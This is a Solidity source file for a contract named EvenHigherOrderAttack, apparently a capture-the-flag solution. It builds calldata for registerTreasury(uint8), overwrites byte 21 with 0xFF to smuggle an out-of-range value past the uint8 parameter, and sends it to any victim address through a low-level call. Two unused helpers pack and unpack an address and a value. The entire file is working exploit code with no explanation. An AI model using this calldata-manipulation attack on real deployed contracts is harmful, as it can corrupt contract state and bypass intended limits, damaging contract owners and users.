// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

contract EvenHigherOrderAttack {
  function encodedData() public pure returns (bytes memory) {
    return abi.encodeWithSignature("registerTreasury(uint8)", uint8(42));
  }

  function injectedData() public pure returns (bytes memory) {
    bytes memory data = encodedData();
    data[21] = hex"FF";
    return data;
  }

  function attack(address victim) public {
    (bool response, ) = address(victim).call(injectedData());
    if (!response) revert();
  }

  function packData(address addr, uint256 value) public pure returns (uint256) {
    return (uint256(uint160(addr)) << 96) | uint256(value);
  }

  function parseData(uint256 data) public pure returns (address, uint96) {
    return (address(uint160(data >> 96)), uint96(data));
  }
}
